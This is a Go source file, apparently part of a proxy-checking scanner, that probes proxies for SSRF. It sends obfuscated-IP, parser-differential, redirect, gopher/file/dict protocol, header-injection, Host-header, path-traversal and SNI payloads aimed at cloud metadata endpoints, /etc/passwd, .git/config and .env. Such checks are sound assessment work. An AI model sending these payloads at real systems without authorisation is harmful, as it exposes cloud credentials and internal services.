package proxy

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
)

// AdvancedSSRFResult contains results from advanced SSRF vulnerability checks
type AdvancedSSRFResult struct {
	ParserDifferentialVuln bool     `json:"parser_differential_vulnerable"`
	ParserBypassPatterns   []string `json:"parser_bypass_patterns,omitempty"`

	IPObfuscationBypass bool     `json:"ip_obfuscation_bypass"`
	BypassedIPFormats   []string `json:"bypassed_ip_formats,omitempty"`

	RedirectChainVuln    bool     `json:"redirect_chain_vulnerable"`
	RedirectChainTargets []string `json:"redirect_chain_targets,omitempty"`

	ProtocolSmugglingVuln bool     `json:"protocol_smuggling_vulnerable"`
	ProtocolSchemes       []string `json:"protocol_schemes,omitempty"`

	HeaderInjectionSSRF bool     `json:"header_injection_ssrf"`
	VulnerableHeaders   []string `json:"vulnerable_headers,omitempty"`

	ProxyPassTraversalVuln bool     `json:"proxy_pass_traversal_vulnerable"`
	TraversalPaths         []string `json:"traversal_paths,omitempty"`

	HostHeaderSSRF      bool     `json:"host_header_ssrf"`
	HostHeaderTargets   []string `json:"host_header_targets,omitempty"`

	// Priority 2 Advanced Checks
	SNIProxySSRF         bool     `json:"sni_proxy_ssrf"`
	SNITargets           []string `json:"sni_targets,omitempty"`
	DNSRebindingVuln     bool     `json:"dns_rebinding_vulnerable"`
	RebindingDetails     []string `json:"rebinding_details,omitempty"`
	HTTP2HeaderInjection bool     `json:"http2_header_injection"`
	InjectedHeaders      []string `json:"injected_headers,omitempty"`
	IMDSv2Bypass         bool     `json:"imdsv2_bypass"`
	IMDSv2Details        []string `json:"imdsv2_details,omitempty"`

	// Priority 3 Advanced Checks
	EncodingBypass      bool     `json:"encoding_bypass"`
	EncodingDetails     []string `json:"encoding_details,omitempty"`
	MultipleHostHeaders bool     `json:"multiple_host_headers"`
	HostHeaderDetails   []string `json:"host_header_details,omitempty"`
	CloudHeadersBypass  bool     `json:"cloud_headers_bypass"`
	CloudHeaderDetails  []string `json:"cloud_header_details,omitempty"`
	PortTricks          bool     `json:"port_tricks"`
	PortTrickDetails    []string `json:"port_trick_details,omitempty"`
	FragmentQuery       bool     `json:"fragment_query_manipulation"`
	FragmentDetails     []string `json:"fragment_details,omitempty"`
}

// performAdvancedSSRFChecks runs all advanced SSRF vulnerability checks
func (c *Checker) performAdvancedSSRFChecks(client *http.Client, result *ProxyResult) *AdvancedSSRFResult {
	advancedResult := &AdvancedSSRFResult{}

	if c.debug {
		result.DebugInfo += "[ADVANCED SSRF] Starting advanced SSRF vulnerability checks\n"
	}

	// Test 1: URL Parser Differentials (Orange Tsai research)
	vulnerable, patterns := c.testURLParserDifferentials(client, result)
	if vulnerable {
		advancedResult.ParserDifferentialVuln = true
		advancedResult.ParserBypassPatterns = patterns
	}

	// Test 2: IP Obfuscation Bypass
	vulnerable, formats := c.testIPObfuscation(client, result)
	if vulnerable {
		advancedResult.IPObfuscationBypass = true
		advancedResult.BypassedIPFormats = formats
	}

	// Test 3: Redirect Chain SSRF
	vulnerable, targets := c.testRedirectChainSSRF(client, result)
	if vulnerable {
		advancedResult.RedirectChainVuln = true
		advancedResult.RedirectChainTargets = targets
	}

	// Test 4: Protocol Smuggling
	vulnerable, schemes := c.testProtocolSmuggling(client, result)
	if vulnerable {
		advancedResult.ProtocolSmugglingVuln = true
		advancedResult.ProtocolSchemes = schemes
	}

	// Test 5: Header Injection SSRF
	vulnerable, headers := c.testHeaderInjectionSSRF(client, result)
	if vulnerable {
		advancedResult.HeaderInjectionSSRF = true
		advancedResult.VulnerableHeaders = headers
	}

	// Test 6: Nginx proxy_pass Trailing Slash Traversal
	vulnerable, paths := c.testProxyPassTraversal(client, result)
	if vulnerable {
		advancedResult.ProxyPassTraversalVuln = true
		advancedResult.TraversalPaths = paths
	}

	// Test 7: Host Header SSRF
	vulnerable, hostTargets := c.testHostHeaderSSRF(client, result)
	if vulnerable {
		advancedResult.HostHeaderSSRF = true
		advancedResult.HostHeaderTargets = hostTargets
	}

	// Test 8: SNI Proxy SSRF (TLS SNI field manipulation)
	vulnerable, sniTargets := c.testSNIProxySSRF(result)
	if vulnerable {
		advancedResult.SNIProxySSRF = true
		advancedResult.SNITargets = sniTargets
	}

	// Test 9: DNS Rebinding with Interactsh
	vulnerable, rebindDetails := c.testDNSRebinding(client, result)
	if vulnerable {
		advancedResult.DNSRebindingVuln = true
		advancedResult.RebindingDetails = rebindDetails
	}

	// Test 10: HTTP/2 Header Injection (CRLF in binary headers)
	vulnerable, injectedHeaders := c.testHTTP2HeaderInjection(result)
	if vulnerable {
		advancedResult.HTTP2HeaderInjection = true
		advancedResult.InjectedHeaders = injectedHeaders
	}

	// Test 11: AWS IMDSv2 Token Workflow
	vulnerable, imdsDetails := c.testIMDSv2Bypass(client, result)
	if vulnerable {
		advancedResult.IMDSv2Bypass = true
		advancedResult.IMDSv2Details = imdsDetails
	}

	// Priority 3 Checks

	// Test 12: URL Encoding Bypass
	vulnerable, encodingDetails := c.testEncodingBypass(client, result)
	if vulnerable {
		advancedResult.EncodingBypass = true
		advancedResult.EncodingDetails = encodingDetails
	}

	// Test 13: Multiple Host Headers
	vulnerable, hostDetails := c.testMultipleHostHeaders(client, result)
	if vulnerable {
		advancedResult.MultipleHostHeaders = true
		advancedResult.HostHeaderDetails = hostDetails
	}

	// Test 14: Cloud-Specific Headers
	vulnerable, cloudDetails := c.testCloudHeaders(client, result)
	if vulnerable {
		advancedResult.CloudHeadersBypass = true
		advancedResult.CloudHeaderDetails = cloudDetails
	}

	// Test 15: Port Specification Tricks
	vulnerable, portDetails := c.testPortTricks(client, result)
	if vulnerable {
		advancedResult.PortTricks = true
		advancedResult.PortTrickDetails = portDetails
	}

	// Test 16: Fragment/Query Manipulation
	vulnerable, fragmentDetails := c.testFragmentQuery(client, result)
	if vulnerable {
		advancedResult.FragmentQuery = true
		advancedResult.FragmentDetails = fragmentDetails
	}

	if c.debug {
		result.DebugInfo += "[ADVANCED SSRF] Complete\n"
	}

	return advancedResult
}

// testURLParserDifferentials tests for URL parser differential attacks (Orange Tsai research)
func (c *Checker) testURLParserDifferentials(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[URL PARSER DIFF] Testing URL parser differential bypasses\n"
	}

	vulnerable := false
	bypassPatterns := []string{}

	// Target internal metadata service
	internalTarget := "169.254.169.254"

	// Test patterns from Orange Tsai's research
	testCases := []struct {
		pattern     string
		description string
	}{
		// @ symbol confusion
		{
			pattern:     fmt.Sprintf("http://example.com@%s/latest/meta-data/", internalTarget),
			description: "@ symbol userinfo confusion",
		},
		{
			pattern:     fmt.Sprintf("http://%s@example.com/", internalTarget),
			description: "@ symbol reversed",
		},
		{
			pattern:     fmt.Sprintf("http://example.com:80@%s/", internalTarget),
			description: "@ symbol with port",
		},

		// Backslash confusion
		{
			pattern:     fmt.Sprintf("http://%s\\@example.com/", internalTarget),
			description: "Backslash @ escape",
		},
		{
			pattern:     fmt.Sprintf("http://example.com\\@%s/", internalTarget),
			description: "Backslash @ reversed",
		},

		// Null byte truncation
		{
			pattern:     fmt.Sprintf("http://%s%%00.example.com/", internalTarget),
			description: "Null byte truncation",
		},
		{
			pattern:     fmt.Sprintf("http://%s%%00/", internalTarget),
			description: "Null byte in path",
		},

		// Fragment/query confusion
		{
			pattern:     fmt.Sprintf("http://example.com#@%s/", internalTarget),
			description: "Fragment with @",
		},
		{
			pattern:     fmt.Sprintf("http://example.com?@%s", internalTarget),
			description: "Query with @",
		},

		// IPv6 brackets confusion
		{
			pattern:     fmt.Sprintf("http://[%s]/", internalTarget),
			description: "IPv6 bracket notation",
		},

		// URL encoding bypasses
		{
			pattern:     fmt.Sprintf("http://%%31%%36%%39.254.169.254/"),
			description: "URL encoded IP",
		},

		// Double encoding
		{
			pattern:     fmt.Sprintf("http://%%32%%35%%31.254.169.254/"),
			description: "Double encoded IP",
		},

		// Mixed encoding
		{
			pattern:     fmt.Sprintf("http://%s%%2eexample.com/", internalTarget),
			description: "Mixed encoding dot",
		},
	}

	for _, tc := range testCases {
		// Try to make request through the proxy
		req, err := http.NewRequest("GET", c.config.ValidationURL, nil)
		if err != nil {
			continue
		}

		// Try the parser differential pattern as query parameter
		testURL := fmt.Sprintf("%s?url=%s", c.config.ValidationURL, url.QueryEscape(tc.pattern))
		req.URL, _ = url.Parse(testURL)

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		// Check for metadata service response indicators
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "instance-id") ||
			strings.Contains(bodyStr, "iam/security-credentials") ||
			strings.Contains(bodyStr, "computeMetadata") ||
			strings.Contains(bodyStr, "metadata")) {

			vulnerable = true
			bypassPatterns = append(bypassPatterns, tc.description+": "+tc.pattern)

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] Parser differential bypass: %s\n", tc.description)
			}
		}
	}

	return vulnerable, bypassPatterns
}

// testIPObfuscation tests IP address obfuscation bypasses
func (c *Checker) testIPObfuscation(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[IP OBFUSCATION] Testing IP address obfuscation bypasses\n"
	}

	vulnerable := false
	bypassedFormats := []string{}

	// Target: 169.254.169.254 (AWS metadata)
	testCases := []struct {
		format      string
		description string
	}{
		// Decimal notation
		{
			format:      "http://2852039166/latest/meta-data/",
			description: "Decimal IP (169.254.169.254)",
		},

		// Octal notation
		{
			format:      "http://0251.0376.0251.0376/latest/meta-data/",
			description: "Octal IP",
		},

		// Hexadecimal notation
		{
			format:      "http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/",
			description: "Hex IP",
		},

		// Mixed notation
		{
			format:      "http://169.0xfe.169.254/latest/meta-data/",
			description: "Mixed decimal/hex IP",
		},

		// Dotted hex
		{
			format:      "http://0xa9fea9fe/latest/meta-data/",
			description: "Dotted hex IP",
		},

		// Abbreviated IPv4
		{
			format:      "http://169.254.43518/latest/meta-data/",
			description: "Abbreviated IPv4 (169.254.169.254)",
		},

		// IPv6 localhost representations
		{
			format:      "http://[::1]/",
			description: "IPv6 localhost",
		},
		{
			format:      "http://[0:0:0:0:0:0:0:1]/",
			description: "IPv6 localhost expanded",
		},
		{
			format:      "http://[::ffff:127.0.0.1]/",
			description: "IPv4-mapped IPv6 localhost",
		},
		{
			format:      "http://[::ffff:a9fe:a9fe]/",
			description: "IPv4-mapped IPv6 metadata",
		},

		// Zero representations
		{
			format:      "http://0/",
			description: "Zero as localhost",
		},

		// Localhost variations
		{
			format:      "http://127.1/",
			description: "Abbreviated localhost",
		},
		{
			format:      "http://0177.0.0.1/",
			description: "Octal localhost",
		},
		{
			format:      "http://0x7f.0.0.1/",
			description: "Hex localhost",
		},
		{
			format:      "http://2130706433/",
			description: "Decimal localhost (127.0.0.1)",
		},
	}

	for _, tc := range testCases {
		// Try to access through proxy
		testURL := fmt.Sprintf("%s?url=%s", c.config.ValidationURL, url.QueryEscape(tc.format))
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		// Check for successful access to internal service
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "instance-id") ||
			strings.Contains(bodyStr, "metadata") ||
			len(bodyStr) > 100) { // Got substantial response

			vulnerable = true
			bypassedFormats = append(bypassedFormats, tc.description)

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] IP obfuscation bypass: %s\n", tc.description)
			}
		}
	}

	return vulnerable, bypassedFormats
}

// testRedirectChainSSRF tests for SSRF via redirect chains
func (c *Checker) testRedirectChainSSRF(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[REDIRECT CHAIN] Testing SSRF via redirect chains\n"
	}

	vulnerable := false
	targets := []string{}

	// Create a client that FOLLOWS redirects (opposite of our normal behavior)
	redirectClient := &http.Client{
		Timeout: c.config.Timeout,
		Transport: client.Transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Follow up to 10 redirects
			if len(via) >= 10 {
				return fmt.Errorf("stopped after 10 redirects")
			}
			return nil
		},
	}

	// Test cases for redirect-based SSRF
	// In a real implementation, you'd use Interactsh to create redirect endpoints
	// For now, we test if the proxy follows redirects at all
	testCases := []struct {
		redirectURL string
		target      string
		description string
	}{
		{
			redirectURL: "http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/",
			target:      "169.254.169.254",
			description: "Redirect to AWS metadata",
		},
		{
			redirectURL: "http://httpbin.org/redirect-to?url=http://metadata.google.internal/",
			target:      "metadata.google.internal",
			description: "Redirect to GCP metadata",
		},
		{
			redirectURL: "http://httpbin.org/redirect-to?url=http://localhost:6379/",
			target:      "localhost:6379",
			description: "Redirect to Redis",
		},
	}

	for _, tc := range testCases {
		// Try to access redirect URL through proxy
		testURL := fmt.Sprintf("%s?url=%s", c.config.ValidationURL, url.QueryEscape(tc.redirectURL))
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := redirectClient.Do(req)
		if err != nil {
			// Check if error indicates we reached internal service
			if strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") {
				// This actually confirms the proxy tried to reach the internal host
				vulnerable = true
				targets = append(targets, tc.description+" (connection attempt detected)")

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Redirect chain to internal target: %s\n", tc.description)
				}
			}
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		// Check if we got response from internal service
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "metadata") ||
			strings.Contains(bodyStr, "redis_version")) {

			vulnerable = true
			targets = append(targets, tc.description)

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] Redirect chain SSRF: %s\n", tc.description)
			}
		}
	}

	return vulnerable, targets
}

// testProtocolSmuggling tests for protocol smuggling vulnerabilities
func (c *Checker) testProtocolSmuggling(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[PROTOCOL SMUGGLING] Testing protocol smuggling\n"
	}

	vulnerable := false
	schemes := []string{}

	testCases := []struct {
		url         string
		scheme      string
		description string
	}{
		// File protocol
		{
			url:         "file:///etc/passwd",
			scheme:      "file",
			description: "file:// - Local file access",
		},
		{
			url:         "file:///c:/windows/win.ini",
			scheme:      "file",
			description: "file:// - Windows system file",
		},

		// Gopher protocol (can inject arbitrary TCP)
		{
			url:         "gopher://127.0.0.1:6379/_INFO",
			scheme:      "gopher",
			description: "gopher:// - Redis command injection",
		},
		{
			url:         "gopher://localhost:25/_MAIL%20FROM",
			scheme:      "gopher",
			description: "gopher:// - SMTP command injection",
		},

		// Dict protocol
		{
			url:         "dict://127.0.0.1:11211/stats",
			scheme:      "dict",
			description: "dict:// - Memcached enumeration",
		},

		// FTP protocol
		{
			url:         "ftp://internal.ftp.server/",
			scheme:      "ftp",
			description: "ftp:// - Internal FTP access",
		},

		// LDAP protocol
		{
			url:         "ldap://internal.ldap/dc=example,dc=com",
			scheme:      "ldap",
			description: "ldap:// - LDAP directory access",
		},

		// TFTP protocol
		{
			url:         "tftp://10.0.0.1/config.txt",
			scheme:      "tftp",
			description: "tftp:// - TFTP file retrieval",
		},

		// Java-specific protocols
		{
			url:         "jar:file:///tmp/evil.jar!/",
			scheme:      "jar",
			description: "jar:// - Java archive access",
		},
		{
			url:         "netdoc:///etc/passwd",
			scheme:      "netdoc",
			description: "netdoc:// - Java network document",
		},
	}

	for _, tc := range testCases {
		// Try to access through proxy using URL parameter
		testURL := fmt.Sprintf("%s?url=%s", c.config.ValidationURL, url.QueryEscape(tc.url))
		req, err := http.NewRequest("GET", testURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			// Some errors indicate the proxy tried to use the protocol
			if strings.Contains(err.Error(), "unsupported protocol") ||
				strings.Contains(err.Error(), "unknown protocol") {
				// Proxy rejected it, but tried to parse it
				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [INFO] Protocol %s rejected (parsing attempted)\n", tc.scheme)
				}
			}
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for indicators that the protocol was used
		switch tc.scheme {
		case "file":
			if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "[extensions]") {
				vulnerable = true
				schemes = append(schemes, tc.description)
			}
		case "gopher":
			if strings.Contains(bodyStr, "redis_version") || strings.Contains(bodyStr, "250 ok") {
				vulnerable = true
				schemes = append(schemes, tc.description)
			}
		case "dict":
			if strings.Contains(bodyStr, "stats") || strings.Contains(bodyStr, "version") {
				vulnerable = true
				schemes = append(schemes, tc.description)
			}
		case "ftp":
			if strings.Contains(bodyStr, "220") || strings.Contains(bodyStr, "ftp") {
				vulnerable = true
				schemes = append(schemes, tc.description)
			}
		case "ldap":
			if strings.Contains(bodyStr, "dn:") || strings.Contains(bodyStr, "ldap") {
				vulnerable = true
				schemes = append(schemes, tc.description)
			}
		}

		if vulnerable && c.debug {
			result.DebugInfo += fmt.Sprintf("  [VULN] Protocol smuggling: %s\n", tc.description)
		}
	}

	return vulnerable, schemes
}

// testHeaderInjectionSSRF tests for SSRF via header injection
func (c *Checker) testHeaderInjectionSSRF(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[HEADER INJECTION SSRF] Testing header injection for SSRF\n"
	}

	vulnerable := false
	vulnerableHeaders := []string{}

	internalTargets := []string{
		"169.254.169.254",
		"metadata.google.internal",
		"localhost",
		"127.0.0.1",
	}

	// Headers that might influence backend routing
	testHeaders := map[string]string{
		"X-Forwarded-Host":     "",
		"X-Forwarded-For":      "",
		"X-Forwarded-Proto":    "http",
		"X-Original-URL":       "",
		"X-Rewrite-URL":        "",
		"X-Real-IP":            "",
		"Forwarded":            "",
		"X-Forwarded-Server":   "",
		"X-HTTP-Host-Override": "",
		"X-Host":               "",
	}

	for headerName := range testHeaders {
		for _, target := range internalTargets {
			req, err := http.NewRequest("GET", c.config.ValidationURL, nil)
			if err != nil {
				continue
			}

			// Set the header to internal target
			switch headerName {
			case "Forwarded":
				req.Header.Set(headerName, fmt.Sprintf("for=%s;host=%s;proto=http", target, target))
			case "X-Original-URL", "X-Rewrite-URL":
				req.Header.Set(headerName, fmt.Sprintf("http://%s/latest/meta-data/", target))
			default:
				req.Header.Set(headerName, target)
			}

			req.Header.Set("User-Agent", c.config.UserAgent)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			bodyStr := string(body)

			// Check if backend responded with internal service data
			if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
				strings.Contains(bodyStr, "instance-id") ||
				strings.Contains(bodyStr, "metadata") ||
				strings.Contains(bodyStr, "computeMetadata")) {

				vulnerable = true
				vulnerableHeaders = append(vulnerableHeaders, fmt.Sprintf("%s → %s", headerName, target))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] Header injection SSRF: %s targets %s\n", headerName, target)
				}

				break // Found vulnerability with this header
			}
		}
	}

	return vulnerable, vulnerableHeaders
}

// testProxyPassTraversal tests for Nginx proxy_pass trailing slash path traversal
func (c *Checker) testProxyPassTraversal(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[PROXY_PASS TRAVERSAL] Testing Nginx proxy_pass path traversal\n"
	}

	vulnerable := false
	traversalPaths := []string{}

	// Test paths that exploit proxy_pass without trailing slash
	testCases := []struct {
		path        string
		description string
	}{
		{
			path:        "/api/../admin",
			description: "Path traversal to /admin",
		},
		{
			path:        "/api/..;/admin",
			description: "Semicolon bypass to /admin",
		},
		{
			path:        "/api/%2e%2e/admin",
			description: "URL encoded traversal",
		},
		{
			path:        "/api/.%2e/admin",
			description: "Mixed encoding traversal",
		},
		{
			path:        "/api/../../../etc/passwd",
			description: "Deep path traversal",
		},
		{
			path:        "/static/../.git/config",
			description: "Git config exposure via traversal",
		},
		{
			path:        "/images/..;/.env",
			description: "Env file via semicolon bypass",
		},
	}

	for _, tc := range testCases {
		req, err := http.NewRequest("GET", c.config.ValidationURL+tc.path, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := strings.ToLower(string(body))

		// Check for successful path traversal
		if resp.StatusCode == 200 {
			// Check for admin panel indicators
			if strings.Contains(bodyStr, "admin") && (strings.Contains(bodyStr, "dashboard") ||
				strings.Contains(bodyStr, "login") ||
				strings.Contains(bodyStr, "panel")) {
				vulnerable = true
				traversalPaths = append(traversalPaths, tc.description)
			}

			// Check for system file indicators
			if strings.Contains(bodyStr, "root:x:0:0") ||
				strings.Contains(bodyStr, "[core]") ||
				strings.Contains(bodyStr, "db_password") {
				vulnerable = true
				traversalPaths = append(traversalPaths, tc.description)
			}

			if vulnerable && c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] proxy_pass traversal: %s\n", tc.description)
			}
		}
	}

	return vulnerable, traversalPaths
}

// testHostHeaderSSRF tests for SSRF via Host header manipulation
func (c *Checker) testHostHeaderSSRF(client *http.Client, result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[HOST HEADER SSRF] Testing Host header SSRF\n"
	}

	vulnerable := false
	targets := []string{}

	internalHosts := []string{
		"169.254.169.254",
		"metadata.google.internal",
		"localhost",
		"127.0.0.1:6379",
		"internal.service",
	}

	for _, host := range internalHosts {
		// Test 1: Single Host header with internal target
		req, err := http.NewRequest("GET", c.config.ValidationURL, nil)
		if err != nil {
			continue
		}

		req.Host = host
		req.Header.Set("User-Agent", c.config.UserAgent)

		resp, err := client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)

		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "metadata") ||
			strings.Contains(bodyStr, "redis_version")) {

			vulnerable = true
			targets = append(targets, "Host: "+host)

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] Host header SSRF: %s\n", host)
			}
		}

		// Test 2: Absolute URI with conflicting Host header
		// This requires custom HTTP request building
		// Skipping for now as it requires low-level socket manipulation
	}

	return vulnerable, targets
}

// testSNIProxySSRF tests for SNI proxy SSRF vulnerabilities
// Note: This requires TLS connection manipulation, which is complex
// This is a simplified version that tests basic SNI behavior
func (c *Checker) testSNIProxySSRF(result *ProxyResult) (bool, []string) {
	if c.debug {
		result.DebugInfo += "[SNI PROXY SSRF] Testing SNI proxy SSRF\n"
	}

	vulnerable := false
	targets := []string{}

	// Parse the validation URL to get the host
	validationURL, err := url.Parse(c.config.ValidationURL)
	if err != nil {
		return false, nil
	}

	host := validationURL.Hostname()
	port := validationURL.Port()
	if port == "" {
		port = "443"
	}

	// Internal targets to test via SNI
	internalSNITargets := []string{
		"169.254.169.254",
		"metadata.google.internal",
		"internal.service",
		"localhost",
	}

	for _, sniTarget := range internalSNITargets {
		// Create TLS config with custom SNI
		tlsConfig := &tls.Config{
			ServerName:         sniTarget,
			InsecureSkipVerify: true,
		}

		// Create custom dialer
		conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%s", host, port), tlsConfig)
		if err != nil {
			// Connection failed - this might actually indicate the proxy tried to connect to internal target
			if strings.Contains(err.Error(), "connection refused") ||
				strings.Contains(err.Error(), "no route to host") ||
				strings.Contains(err.Error(), "i/o timeout") {
				vulnerable = true
				targets = append(targets, fmt.Sprintf("SNI: %s (connection attempt detected)", sniTarget))

				if c.debug {
					result.DebugInfo += fmt.Sprintf("  [VULN] SNI proxy attempted connection to: %s\n", sniTarget)
				}
			}
			continue
		}
		defer conn.Close()

		// Try to send HTTP request
		fmt.Fprintf(conn, "GET /latest/meta-data/ HTTP/1.1\r\nHost: %s\r\n\r\n", sniTarget)

		// Read response
		buffer := make([]byte, 4096)
		n, err := conn.Read(buffer)
		if err != nil && err != io.EOF {
			continue
		}

		response := string(buffer[:n])
		if strings.Contains(response, "ami-id") || strings.Contains(response, "metadata") {
			vulnerable = true
			targets = append(targets, fmt.Sprintf("SNI: %s (successful response)", sniTarget))

			if c.debug {
				result.DebugInfo += fmt.Sprintf("  [VULN] SNI proxy SSRF successful: %s\n", sniTarget)
			}
		}
	}

	return vulnerable, targets
}
